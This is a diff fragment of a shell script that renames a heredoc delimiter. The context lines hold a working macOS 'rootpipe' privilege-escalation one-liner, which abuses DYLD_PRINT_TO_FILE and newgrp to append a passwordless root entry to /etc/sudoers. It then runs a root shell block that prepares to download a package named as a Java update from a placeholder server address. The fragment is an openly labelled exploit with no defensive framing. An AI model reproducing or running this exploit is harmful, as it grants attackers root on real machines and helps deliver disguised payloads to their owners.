@@ -26,7 +26,7 @@ echo -e '\033[1mExploiting machine...\033[0m'
 echo
 
 #--- EPLOIT THE MACHINE WITH ROOTPIPE ---#
-echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash <<'INJECTINTOBASH'
+echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo bash <<'BASHINJECT'
 randomTMP=/tmp$$/
 serverAddress=http://<SERVER_ADDRESS>/Java_8_Update_60.pkg
 curledFile=/tmp$$/Java_8_Update_60.pkg
@@ -72,7 +72,7 @@ curledFile=/tmp$$/Java_8_Update_60.pkg
     echo -e "\033[1mCompleted successfully.\033[0m"
   fi
   exit 0
-INJECTINTOBASH
+BASHINJECT
 }
 #--- MAKE SURE WE SUCCEED ---#
 trap KeepSafe exit
